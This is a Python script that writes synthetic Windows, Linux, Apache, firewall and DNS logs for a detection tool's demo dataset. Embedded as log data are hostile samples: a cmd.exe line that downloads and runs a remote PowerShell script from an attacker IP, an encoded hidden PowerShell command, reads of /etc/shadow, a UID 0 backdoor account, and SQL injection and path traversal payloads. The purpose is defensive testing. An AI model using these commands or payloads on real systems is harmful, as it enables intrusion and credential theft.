"""
Generates synthetic sample logs for SOCShield's bundled demo dataset.

Produces a mix of benign background traffic and deliberately embedded
attack scenarios (brute force, credential dumping, persistence, web
exploitation, C2-like DNS, port scanning) so the Sigma rules in
sigma_rules/ and the frequency-based brute-force correlation both have
something real to catch out of the box.

Run once from the datasets/ directory: `python generate_datasets.py`
"""
import json
import random
from datetime import datetime, timedelta, timezone

random.seed(42)

NOW = datetime(2026, 7, 25, 9, 0, 0, tzinfo=timezone.utc)

INTERNAL_HOSTS = ["web01", "web02", "db01", "dc01", "ws-fin-07", "ws-hr-12"]
INTERNAL_USERS = ["analyst", "jsmith", "mchen", "administrator", "svc_backup"]
ATTACKER_IPS = ["203.0.113.7", "198.51.100.23", "185.220.101.45"]
BENIGN_EXTERNAL_IPS = ["192.0.2.10", "8.8.8.8", "1.1.1.1", "104.16.85.20"]
INTERNAL_IPS = ["10.0.0.5", "10.0.0.12", "10.0.1.20", "192.168.1.50"]


def ts(offset_minutes: float) -> str:
    return (NOW + timedelta(minutes=offset_minutes)).strftime("%Y-%m-%dT%H:%M:%SZ")


def ts_syslog(offset_minutes: float) -> str:
    return (NOW + timedelta(minutes=offset_minutes)).strftime("%b %d %H:%M:%S")


# ---------------------------------------------------------------------------
# Windows event logs (JSON export format)
# ---------------------------------------------------------------------------
def generate_windows_logs():
    events = []
    t = 0.0

    # Benign successful logons + process creation
    for i in range(15):
        t += random.uniform(1, 4)
        events.append({
            "EventID": 4624,
            "TimeCreated": ts(t),
            "Channel": "Security",
            "Computer": random.choice(INTERNAL_HOSTS),
            "LogonType": 3,
            "TargetUserName": random.choice(INTERNAL_USERS),
            "IpAddress": random.choice(INTERNAL_IPS),
            "Message": "An account was successfully logged on.",
        })

    # Attack scenario 1: RDP brute force against dc01 from one external IP (>=6 failures in a burst)
    attacker = ATTACKER_IPS[0]
    burst_start = t + 5
    for i in range(7):
        events.append({
            "EventID": 4625,
            "TimeCreated": ts(burst_start + i * 0.7),
            "Channel": "Security",
            "Computer": "dc01",
            "LogonType": 3,
            "TargetUserName": random.choice(["administrator", "admin", "root", "svc_backup"]),
            "IpAddress": attacker,
            "WorkstationName": "UNKNOWN",
            "Message": "An account failed to log on.",
        })
    t = burst_start + 7

    # Attack scenario 2: encoded PowerShell execution on ws-fin-07
    t += 10
    events.append({
        "EventID": 4688,
        "TimeCreated": ts(t),
        "Channel": "Security",
        "Computer": "ws-fin-07",
        "TargetUserName": "jsmith",
        "ParentImage": "C:\\Windows\\explorer.exe",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "Message": "A new process has been created.",
    })

    # Attack scenario 3: malicious Office macro spawning cmd.exe on ws-hr-12
    t += 8
    events.append({
        "EventID": 4688,
        "TimeCreated": ts(t),
        "Channel": "Security",
        "Computer": "ws-hr-12",
        "TargetUserName": "mchen",
        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "Image": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "cmd.exe /c powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/stage2.ps1')\"",
        "Message": "A new process has been created.",
    })

    # Attack scenario 4: suspicious new admin account created + added to Administrators group
    t += 15
    events.append({
        "EventID": 4720,
        "TimeCreated": ts(t),
        "Channel": "Security",
        "Computer": "dc01",
        "TargetUserName": "svc_updater",
        "Message": "A user account was created.",
    })
    t += 1
    events.append({
        "EventID": 4732,
        "TimeCreated": ts(t),
        "Channel": "Security",
        "Computer": "dc01",
        "TargetUserName": "svc_updater",
        "Message": "A member was added to a security-enabled local group.",
    })

    # More benign noise interspersed
    for i in range(10):
        t += random.uniform(2, 6)
        events.append({
            "EventID": 4688,
            "TimeCreated": ts(t),
            "Channel": "Security",
            "Computer": random.choice(INTERNAL_HOSTS),
            "TargetUserName": random.choice(INTERNAL_USERS),
            "ParentImage": "C:\\Windows\\explorer.exe",
            "Image": "C:\\Windows\\System32\\notepad.exe",
            "CommandLine": "notepad.exe report.txt",
            "Message": "A new process has been created.",
        })

    return events


# ---------------------------------------------------------------------------
# Linux auth.log
# ---------------------------------------------------------------------------
def generate_linux_auth_log():
    lines = []
    t = 0.0

    def line(offset, host, proc, pid, msg):
        return f"{ts_syslog(offset)} {host} {proc}[{pid}]: {msg}"

    # Benign accepted logins
    for i in range(8):
        t += random.uniform(1, 5)
        lines.append(line(t, "web01", "sshd", 1000 + i, f"Accepted password for {random.choice(INTERNAL_USERS)} from {random.choice(INTERNAL_IPS)} port {40000+i} ssh2"))

    # Attack scenario: SSH brute force burst from one attacker IP (>=6 failures within ~8 min)
    attacker = ATTACKER_IPS[1]
    burst_start = t + 5
    users_tried = ["root", "admin", "test", "oracle", "postgres", "ubuntu", "guest"]
    for i, u in enumerate(users_tried):
        lines.append(line(burst_start + i * 1.1, "web01", "sshd", 2000 + i, f"Failed password for invalid user {u} from {attacker} port {50000+i} ssh2"))
        lines.append(line(burst_start + i * 1.1 + 0.1, "web01", "sshd", 2000 + i, f"Invalid user {u} from {attacker} port {50000+i}"))
    t = burst_start + len(users_tried)

    # A couple of genuine but wrong-password failures from an internal analyst (benign, low volume)
    t += 10
    lines.append(line(t, "web01", "sshd", 3001, f"Failed password for analyst from {INTERNAL_IPS[0]} port 55321 ssh2"))

    # Attack scenario: credential dumping via sudo cat /etc/shadow
    t += 12
    lines.append(line(t, "db01", "sudo", 4001, "www-data : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/cat /etc/shadow"))
    t += 0.5
    lines.append(line(t, "db01", "sudo", 4002, "www-data : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/cat /etc/passwd"))

    # Attack scenario: backdoor root-equivalent account created
    t += 6
    lines.append(line(t, "db01", "useradd", 4010, "new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash"))

    # Benign account creation (normal onboarding, non-zero UID)
    t += 20
    lines.append(line(t, "web01", "useradd", 4020, "new user: name=kjohnson, UID=1005, GID=1005, home=/home/kjohnson, shell=/bin/bash"))

    # More benign noise
    for i in range(6):
        t += random.uniform(3, 8)
        lines.append(line(t, random.choice(["web01", "web02"]), "sshd", 5000 + i, f"Accepted password for {random.choice(INTERNAL_USERS)} from {random.choice(INTERNAL_IPS)} port {41000+i} ssh2"))

    return lines


# ---------------------------------------------------------------------------
# Apache combined access log
# ---------------------------------------------------------------------------
def generate_apache_log():
    lines = []
    t = 0.0

    def apache_ts(offset):
        return (NOW + timedelta(minutes=offset)).strftime("%d/%b/%Y:%H:%M:%S +0000")

    def line(offset, ip, method, uri, status, size, ref, agent):
        return f'{ip} - - [{apache_ts(offset)}] "{method} {uri} HTTP/1.1" {status} {size} "{ref}" "{agent}"'

    benign_uris = ["/", "/index.html", "/products", "/about", "/api/v1/health", "/static/app.js", "/favicon.ico"]
    agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    for i in range(20):
        t += random.uniform(0.2, 2)
        lines.append(line(t, random.choice(BENIGN_EXTERNAL_IPS + INTERNAL_IPS), "GET", random.choice(benign_uris), 200, random.randint(200, 5000), "-", agent))

    # Attack: SQL injection attempts
    attacker = ATTACKER_IPS[0]
    t += 5
    for payload in ["/login.php?user=admin' OR '1'='1&pass=x", "/products.php?id=1 UNION SELECT username,password FROM users--+", "/search.php?q=1' AND SLEEP(5)--+"]:
        t += 1
        lines.append(line(t, attacker, "GET", payload, 200, random.randint(200, 900), "-", "sqlmap/1.7"))

    # Attack: sensitive file probing
    attacker2 = ATTACKER_IPS[2]
    t += 4
    for payload, status in [("/.env", 404), ("/.git/config", 404), ("/wp-config.php", 403), ("/../../../etc/passwd", 400)]:
        t += 0.8
        lines.append(line(t, attacker2, "GET", payload, status, 300, "-", "curl/8.4.0"))

    # Some 5xx errors (benign app errors, not necessarily attack, but useful severity signal)
    t += 6
    for i in range(3):
        t += 2
        lines.append(line(t, random.choice(INTERNAL_IPS), "POST", "/api/v1/orders", 500, 150, "-", agent))

    for i in range(10):
        t += random.uniform(0.5, 2)
        lines.append(line(t, random.choice(BENIGN_EXTERNAL_IPS), "GET", random.choice(benign_uris), 200, random.randint(200, 5000), "-", agent))

    return lines


# ---------------------------------------------------------------------------
# Firewall logs (JSON)
# ---------------------------------------------------------------------------
def generate_firewall_logs():
    records = []
    t = 0.0

    for i in range(15):
        t += random.uniform(0.5, 3)
        records.append({
            "timestamp": ts(t),
            "hostname": "edge-fw01",
            "SourceIp": random.choice(INTERNAL_IPS),
            "DestinationIp": random.choice(BENIGN_EXTERNAL_IPS),
            "SourcePort": random.randint(1024, 65000),
            "DestinationPort": random.choice([443, 80, 53]),
            "Protocol": "TCP",
            "Action": "ALLOW",
            "Bytes": random.randint(500, 50000),
            "Rule": "OUTBOUND_WEB",
        })

    # Port scan / sensitive port probing from attacker IPs
    for attacker in ATTACKER_IPS:
        for port in [3389, 445, 23, 3306, 22]:
            t += 0.3
            records.append({
                "timestamp": ts(t),
                "hostname": "edge-fw01",
                "SourceIp": attacker,
                "DestinationIp": "10.0.0.5",
                "SourcePort": random.randint(1024, 65000),
                "DestinationPort": port,
                "Protocol": "TCP",
                "Action": "DENY",
                "Bytes": 0,
                "Rule": "DEFAULT_DENY_INBOUND",
            })

    for i in range(10):
        t += random.uniform(0.5, 3)
        records.append({
            "timestamp": ts(t),
            "hostname": "edge-fw01",
            "SourceIp": random.choice(INTERNAL_IPS),
            "DestinationIp": random.choice(BENIGN_EXTERNAL_IPS),
            "SourcePort": random.randint(1024, 65000),
            "DestinationPort": 443,
            "Protocol": "TCP",
            "Action": "ALLOW",
            "Bytes": random.randint(500, 50000),
            "Rule": "OUTBOUND_WEB",
        })

    return records


# ---------------------------------------------------------------------------
# DNS logs (JSON)
# ---------------------------------------------------------------------------
def generate_dns_logs():
    records = []
    t = 0.0
    benign_domains = ["google.com", "github.com", "microsoft.com", "cloudflare.com", "office365.com"]

    for i in range(15):
        t += random.uniform(0.5, 3)
        records.append({
            "timestamp": ts(t),
            "hostname": random.choice(INTERNAL_HOSTS),
            "SourceIp": random.choice(INTERNAL_IPS),
            "QueryName": random.choice(benign_domains),
            "QueryType": "A",
            "ResponseCode": "NOERROR",
            "Answer": "93.184.216.34",
        })

    # Suspicious TLD + DGA-like queries (simulated C2 beaconing)
    suspicious = ["update-service.xyz", "cdn-cache.top", "portal-auth.club", "mgmt-console.gq"]
    for domain in suspicious:
        t += 2
        records.append({
            "timestamp": ts(t),
            "hostname": "ws-fin-07",
            "SourceIp": "10.0.1.20",
            "QueryName": domain,
            "QueryType": "A",
            "ResponseCode": "NOERROR",
            "Answer": "185.220.101.45",
        })

    dga_labels = ["kq3jd9fbslxoqpz7mn2a", "z8x1vbnmqwpoeiudkfjs", "a9s8d7f6g5h4j3k2l1qw"]
    for label in dga_labels:
        t += 1.5
        records.append({
            "timestamp": ts(t),
            "hostname": "ws-fin-07",
            "SourceIp": "10.0.1.20",
            "QueryName": f"{label}.badinfra.net",
            "QueryType": "A",
            "ResponseCode": "NOERROR",
            "Answer": "185.220.101.45",
        })

    for i in range(8):
        t += random.uniform(0.5, 3)
        records.append({
            "timestamp": ts(t),
            "hostname": random.choice(INTERNAL_HOSTS),
            "SourceIp": random.choice(INTERNAL_IPS),
            "QueryName": random.choice(benign_domains),
            "QueryType": "A",
            "ResponseCode": "NOERROR",
            "Answer": "93.184.216.34",
        })

    return records


def main():
    with open("windows_logs/windows_events.json", "w") as f:
        json.dump(generate_windows_logs(), f, indent=2)

    with open("linux_logs/auth.log", "w") as f:
        f.write("\n".join(generate_linux_auth_log()) + "\n")

    with open("apache_logs/access.log", "w") as f:
        f.write("\n".join(generate_apache_log()) + "\n")

    with open("firewall_logs/firewall.json", "w") as f:
        json.dump(generate_firewall_logs(), f, indent=2)

    with open("dns_logs/dns.json", "w") as f:
        json.dump(generate_dns_logs(), f, indent=2)

    print("Generated synthetic datasets in windows_logs/, linux_logs/, apache_logs/, firewall_logs/, dns_logs/")


if __name__ == "__main__":
    main()
